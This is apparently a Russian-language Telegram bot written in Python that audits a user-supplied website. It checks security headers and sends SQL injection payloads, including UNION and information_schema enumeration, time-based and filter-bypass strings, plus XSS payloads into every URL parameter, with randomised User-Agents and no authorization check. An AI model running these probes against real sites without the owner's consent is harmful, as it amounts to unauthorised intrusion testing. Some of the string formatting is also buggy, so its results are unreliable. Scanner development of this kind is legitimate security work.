import asyncio
import requests
import random
import validators
import re
import aiohttp
import os
import socket
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import urlparse, parse_qs, urlencode
from aiogram import Bot, Dispatcher
from aiogram.filters import CommandStart
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from dotenv import load_dotenv

# Получаем токен из переменных окружения
load_dotenv()
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("Не установлен TELEGRAM_BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Ограничиваем количество одновременных запросов
SEM = asyncio.Semaphore(3)

# Проверка на SSRF
PRIVATE_IP_RANGES = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("::1/128"),
    ip_network("fc00::/7"),
]

def is_internal(url):
    try:
        hostname = urlparse(url).hostname
        ip = socket.gethostbyname(hostname)
        return any(ip_address(ip) in net for net in PRIVATE_IP_RANGES)
    except Exception:
        return True  # Блокируем при ошибке

# Функция для создания клавиатуры с кнопками
def create_keyboard():
    button_new_check = KeyboardButton(text="🔄 Начать новую проверку")
    button_help = KeyboardButton(text="❓ Помощь")
    keyboard = ReplyKeyboardMarkup(keyboard=[[button_new_check, button_help]], \
                                   resize_keyboard=True, one_time_keyboard=False)
    return keyboard

# Обработчик команды /start
@dp.message(CommandStart())
async def start(message: Message):
    await message.answer("Привет! Отправь мне URL сайта, и я проверю его безопасность.", \
                         reply_markup=create_keyboard())

# Обработчик нажатия кнопки "Начать новую проверку"
@dp.message(lambda message: message.text == "🔄 Начать новую проверку")
async def new_check(message: Message):
    await message.answer("Отправьте мне новый URL для проверки.", reply_markup=create_keyboard())

# Обработчик нажатия кнопки "Помощь"
@dp.message(lambda message: message.text == "❓ Помощь")
async def help(message: Message):
    help_text = (
        "⚠️ Как использовать бота?\n"
        "1. Отправьте URL сайта, который вы хотите проверить.\n"
        "2. Я выполню проверку на безопасность сайта, включая SQL-инъекции и XSS.\n"
        "3. Подождите несколько минут для получения результатов анализа.\n\n"
        "🔄 Для начала новой проверки нажмите 'Начать новую проверку'"
    )
    await message.answer(help_text, reply_markup=create_keyboard())

# Обработчик для URL
@dp.message()
async def analyze_site(message: Message):
    logger.info(f"Получено сообщение: {message.text}")
    await message.answer(f"Ты отправил: {message.text}") 

    url = message.text.strip()
    if not url.startswith("https"):
        url = "https://" + url 

    if not validators.url(url) or is_internal(url):
        await message.answer("❌ Ошибка: Некорректный или запрещённый URL.")
        return
    
    await message.answer("🔍 Выполняю полный аудит сайта. Это может занять несколько минут...")
    
    # Проверка заголовков безопасности
    headers_result = check_security_headers(url)
    await message.answer("✅ Проверка заголовков выполнена. Выполяется проверка sql-инъекций")

    # Проверка SQL-инъекций
    sqli_results = await check_sqli(url)
    await message.answer("✅ Проверка sql-инъекций выполнена. Выполняется проверка XSS")

    # Проверка XSS
    xss_results = await check_xss(url)
    await message.answer("✅ Проверка XSS выполнена")
    
    # Формируем отчёт
    report = "📌 Результаты проверки:\n\n"
    report += "🔹 Проверка заголовков безопасности:\n" + headers_result + "\n\n"
    report += "🔹 SQL-инъекции:\n" + "\n".join(sqli_results) + "\n\n"
    report += "🔹 XSS:\n" + "\n".join(xss_results) + "\n\n"
    
    await message.answer(report, reply_markup=create_keyboard())

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) \
            Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) \
            Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 \
            (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) \
            Chrome/120.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

def check_security_headers(url):
    try:
        random_headers = {
            "User-Agent": get_random_user_agent(),
            "Accept-Language": "en-US,en;q=0.9",
        }
        result_issues = []

        response = requests.get(url, headers=random_headers, timeout=10)
        if response.status_code != 200:
            result_issues.append([f"⚠️ Статус ответа: {response.status_code}. \
                                  Проверка заголовков может быть некорректна."])
        
        headers = response.headers

        check_funcs = (check_hsts, check_csp, check_clickjacking_security, check_referrer_policy,\
                       check_permissions_security, check_cors_security, check_cross_origin_policies,\
                        check_cache_control)
        for check_func in check_funcs:
            result_issues.append(check_func(headers))

        # Вывод отчёта
        return '\n'.join([issue for sublist in result_issues for issue in sublist]) \
            if result_issues else ["✅ Все заголовки настроены корректно!"]
    
    except requests.exceptions.RequestException as e:
        return [[f"❌ Ошибка запроса: {e}"]]

# HTTP Strict Transport Security (HSTS) — предотвращает Downgrade-атаки (SSL Stripping)
def check_hsts(headers):
    issues = []
    if "Strict-Transport-Security" not in headers:
        issues.append(f"⚠️ HSTS отсутствует → возможно, сайт уязвим к SSL Stripping.")
    else:
        hsts = headers["Strict-Transport-Security"]
        if "max-age" not in hsts:
            issues.append("⚠️ HSTS есть, но max-age не указан.")
        if "includeSubDomains" not in hsts:
            issues.append("⚠️ HSTS не распространяется на поддомены.")
        if "preload" not in hsts:
            issues.append("⚠️ HSTS без preload → браузеры не принудительно используют HTTPS.")

    return issues

# Content Security Policy (CSP) — защита от XSS
def check_csp(headers):
    issues = []
    if "Content-Security-Policy" not in headers:
        issues.append("⚠️ CSP отсутствует → возможны XSS-атаки и внедрение вредоносного контента.")
    else:
        csp = headers["Content-Security-Policy"]
        if "'unsafe-inline'" in csp:
            issues.append("⚠️ CSP позволяет inline-скрипты → XSS возможен.")
        if "'unsafe-eval'" in csp:
            issues.append("⚠️ CSP позволяет eval() → XSS возможен.")

    # Report-To (CSP violation reporting) — логирование нарушений CSP
    if "Report-To" not in headers:
        issues.append("⚠️ Report-To отсутствует → нарушения CSP не логируются.")

    return issues

def check_clickjacking_security(headers):
    issues = []
    
    # X-Frame-Options — защита от Clickjacking
    if "X-Frame-Options" not in headers:
        issues.append("⚠️ X-Frame-Options отсутствует → возможны Clickjacking-атаки.")
    elif headers["X-Frame-Options"].lower() not in ["deny", "sameorigin"]:
        issues.append("⚠️ X-Frame-Options некорректен → лучше использовать DENY или SAMEORIGIN.")

    # X-Content-Type-Options — защита от MIME Sniffing
    if headers.get("X-Content-Type-Options", "").lower() != "nosniff":
        issues.append("⚠️ X-Content-Type-Options отсутствует или настроен неправильно → \
                      возможны MIME-атаки.")

    return issues

def check_referrer_policy(headers):
    issues = []
    
    # Referrer-Policy — предотвращает утечки URL-данных
    allowed_referrer_policies = ("no-referrer", "strict-origin", "strict-origin-when-cross-origin", \
                                 "same-origin", "no-referrer-when-downgrade")
    if "Referrer-Policy" not in headers:
        issues.append("⚠️ Referrer-Policy отсутствует → возможны утечки приватных URL.")
    elif headers["Referrer-Policy"].lower() not in allowed_referrer_policies:
        issues.append(f"⚠️ Referrer-Policy задан как {headers['Referrer-Policy']} → возможно, \
                      утечки данных. Рекомендуется: {', '.join(allowed_referrer_policies)}.")

    return issues

def check_permissions_security(headers):
    issues = []
    
    # Permissions-Policy — ограничение доступа к сенсорам, камере, микрофону
    if "Permissions-Policy" not in headers:
        issues.append("⚠️ Permissions-Policy отсутствует → сайт может запрашивать камеру, микрофон")

    # Expect-CT — защита от поддельных SSL-сертификатов
    if "Expect-CT" not in headers:
        issues.append("⚠️ Expect-CT отсутствует → возможны атаки с поддельными сертификатами.")

    return issues

def check_cors_security(headers):
    issues = []
    
    # Cross-Origin Resource Sharing (CORS) — контроль доступа к ресурсам с других доменов
    if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
        issues.append("⚠️ CORS позволяет доступ с любых источников (Access-Control-Allow-Origin: *).")

    return issues    

def check_cross_origin_policies(headers):
    issues = []
    
    # Cross-Origin-Embedder-Policy (COEP)
    if headers.get("Cross-Origin-Embedder-Policy", "").lower() != "require-corp":
        issues.append("⚠️ COEP не настроен на require-corp → возможны атаки типа Spectre.")

    # Cross-Origin-Opener-Policy (COOP)
    if headers.get("Cross-Origin-Opener-Policy", "").lower() not in ["same-origin", \
                                                                     "same-origin-allow-popups"]:
        issues.append("⚠️ COOP не настроен на same-origin → возможна утечка данных между окнами.")

    return issues 

def check_cache_control(headers):
    issues = []
    
    # Cache-Control
    cache_control = headers.get("Cache-Control", "").lower()
    if not any(x in cache_control for x in ["no-store", "no-cache", "private"]):
        issues.append("⚠️ Cache-Control не запрещает кеширование → возможна утечка \
                      чувствительных данных.")

    return issues 

async def check_sqli(url):
    SQLI_PAYLOADS = [
    # Логические инъекции
    "' OR 1=1 --",
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR '1'='1' --",
    "' OR 'x'='x' --",
    "' OR 'admin'='admin' --",

    # UNION-инъекции
    "' UNION SELECT null, null, null --",
    "' UNION SELECT 1, 'admin', 'password' --",
    "' UNION SELECT table_name, column_name, null FROM information_schema.columns --",

    # Ошибко-ориентированные инъекции
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1)) > 64 --",

    # Инъекции для разных СУБД
    "' AND SLEEP(5) --",  # MySQL
    "' AND pg_sleep(5) --",  # PostgreSQL
    "' AND WAITFOR DELAY '0:0:5' --",  # MSSQL

    # Инъекции для обхода фильтров
    "'/**/OR/**/1=1 --",
    "'%20OR%201=1 --",
    "'%0AOR%0A1=1 --"]

    SQLI_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"error in your SQL syntax",
        r"You have an error in your SQL syntax",
        r"MySQL server version for the right syntax",

        # MSSQL
        r"Warning.*mssql",
        r"Microsoft OLE DB Provider for ODBC Drivers",
        r"Incorrect syntax near",
        r"Unclosed quotation mark before the character string",

        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"syntax error at or near",

        # Oracle
        r"ORA-00933: SQL command not properly ended",
        r"ORA-01756: quoted string not properly terminated",

        # SQLite
        r"SQLite error: near",
        r"SQLite error: syntax error",

        # Общие ошибки
        r"Unclosed quotation mark after the character string",
        r"quoted string not properly terminated",
        r"syntax error at or near"]
    issues = []
    headers = {"User-Agent": get_random_user_agent()}

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        return ["✅ SQL-инъекций не обнаружено (нет параметров)."]

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as normal_response:
                normal_text = await normal_response.text()

            tasks = []
            for param in params:
                for payload in SQLI_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?\
                        {urlencode(test_params, doseq=True)}"
                    tasks.append(test_sqli(session, test_url, param, payload, normal_text, \
                                           headers, SQLI_ERROR_PATTERNS))

            results = await asyncio.gather(*tasks)

            for result in results:
                if result:
                    issues.append(result)

        except aiohttp.ClientError:
            return ["❌ Ошибка подключения при проверке SQL-инъекций."]

    return issues if issues else ["✅ SQL-инъекций не обнаружено."]

async def test_sqli(session, test_url, param, payload, normal_text, headers, error_patterns):
    async with SEM:  # Ограничение на одновременные запросы
        try:
            async with session.get(test_url, headers=headers, timeout=5) as response:
                response_text = await response.text()

                for pattern in error_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return f"⚠️ SQL-инъекция в '{param}'! Найдена ошибка: {pattern}"

                if response.status == 500:
                    return f"⚠️ Возможная SQL-инъекция в '{param}' с payload {payload} \
                        — сервер вернул 500!"

                if normal_text != response_text:
                    return f"⚠️ SQL-инъекция в '{param}' с payload {payload}! Ответ изменился."

            await asyncio.sleep(0.5)  # Пауза между запросами (500 мс)

        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            return f"❌ Ошибка: {str(e)} при проверке '{param}'."

    return None

async def check_xss(url):
    """Проверка XSS-уязвимостей путем вставки вредоносных скриптов"""
    XSS_PAYLOADS = [
    # Базовые пейлоады
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",

    # Дополнительные теги и атрибуты
    "<a href='javascript:alert(1)'>Click me</a>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",

    # Пейлоады для DOM-based XSS
    "#<img src=x onerror=alert(1)>",
    "';alert(1);//",

    # Пейлоады для обхода фильтров
    "%3Cscript%3Ealert(1)%3C/script%3E",
    '" onmouseover=alert(1) x="',
    "&lt;script&gt;alert(1)&lt;/script&gt;",

    # Пейлоады для разных контекстов
    "javascript:alert(1)",
    'x" onerror="alert(1)',
    "';alert(1);//"]
    
    issues = []
    headers = {"User-Agent": get_random_user_agent()}

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        return ["✅ XSS-уязвимостей не обнаружено (нет параметров)."]

    async with aiohttp.ClientSession() as session:
        tasks = []
        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?\
                    {urlencode(test_params, doseq=True)}"
                tasks.append(test_xss(session, test_url, param, payload, headers))

        results = await asyncio.gather(*tasks)

        for result in results:
            if result:
                issues.append(result)

    return issues if issues else ["✅ XSS-уязвимостей не обнаружено."]


async def test_xss(session, test_url, param, payload, headers):
    """Отправляет XSS-пэйлоад и проверяет, вставился ли он в HTML"""
    async with SEM:
        try:
            async with session.get(test_url, headers=headers, timeout=5) as response:
                response_text = await response.text()

                # Проверяем, вернулся ли payload в HTML-ответе без экранирования
                if payload in response_text:
                    return f"⚠️ Найдена XSS в параметре '{param}' с payload `{payload}`!"

            await asyncio.sleep(0.5)

        except asyncio.TimeoutError:
            return f"⏳ Таймаут при проверке XSS в параметре '{param}'."  # Обработка таймаута

        except aiohttp.ClientError:
            return f"❌ Ошибка при проверке XSS в параметре '{param}'."  # Общие ошибки клиента

        except aiohttp.ServerTimeoutError:
            return f"⏳ Сервер не ответил вовремя при проверке XSS в параметре '{param}'."  # Таймаут сервера

        except aiohttp.HttpProcessingError as e:
            return f"❌ Ошибка HTTP при проверке XSS в параметре '{param}': {e}"  # Ошибка HTTP (например, 4xx или 5xx)

        except asyncio.CancelledError:
            return f"❌ Запрос отменен для параметра '{param}'."  # Обработка отмены задачи

        except Exception as e:
            return f"❌ Неизвестная ошибка при проверке XSS в параметре '{param}': {str(e)}"  # Общая ошибка

    return None


async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())